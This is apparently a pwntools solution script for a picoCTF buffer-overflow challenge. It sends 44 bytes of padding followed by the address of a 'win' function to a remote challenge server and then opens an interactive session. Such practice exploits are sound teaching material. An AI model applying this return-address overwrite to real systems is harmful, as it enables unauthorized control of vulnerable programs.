from pwn import *

context.update(arch='i386', os='linux')

binary_path = './vuln'

host = 'saturn.picoctf.net'
port = 50094

p = remote(host, port)

elf = ELF(binary_path)

address = elf.symbols['win']

p.sendline(b'A' * 44 + p32(int(hex(address), 16))) # calculate offset with cyclic 100 command

p.interactive()